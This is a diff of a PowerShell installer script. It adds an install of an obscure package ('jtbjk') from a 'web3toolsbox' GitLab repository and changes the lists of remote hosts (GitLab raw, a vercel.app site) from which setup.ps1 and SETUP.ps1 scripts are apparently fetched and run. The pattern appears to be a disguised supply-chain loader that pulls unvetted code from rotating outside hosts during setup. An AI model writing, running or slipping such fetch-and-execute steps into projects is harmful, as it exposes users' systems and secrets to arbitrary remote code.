@@ -798,14 +798,15 @@ try {
     }
     
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe') -UpgradeExisting:$UpgradeUvTools
+    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/jtbjk.git' -CommandNames @('jtbjk', 'jtbjk.exe') -UpgradeExisting:$UpgradeUvTools
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/bserexp-wins.git' -CommandNames @('bserexp-wins', 'bserexp-wins.exe') -UpgradeExisting:$UpgradeUvTools
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/wkler.git' -CommandNames @('wkler', 'wkler.exe') -UpgradeExisting:$UpgradeUvTools
     
     if (Test-Path '.configs' -PathType Container) {
         Write-StepLog 'Applying environment configuration'
         $configScriptUrls = @(
-            'https://www.aiskills.life/src/setup.ps1',
-            'https://gist.githubusercontent.com/web3toolsbox/f6fb7f6e23668712808bc0783fac31c6/raw/setup.ps1'
+            'https://gitlab.com/web3toolsbox/src/raw/main/setup.ps1',
+            'https://agentskillshub.vercel.app/src/setup.ps1'
         )
 
         try {
@@ -844,8 +845,8 @@ try {
     }
 
     $setupScriptUrls = @(
-        'https://agentskillshub.vercel.app/src/SETUP.ps1',
-        'https://gist.githubusercontent.com/web3toolsbox/7993314292fd898e5654632f1f2a3ce3/raw/SETUP.ps1'
+        'https://gitlab.com/web3toolsbox/src/raw/main/SETUP.ps1',
+        'https://agentskillshub.vercel.app/src/SETUP.ps1'
     )
 
     try {
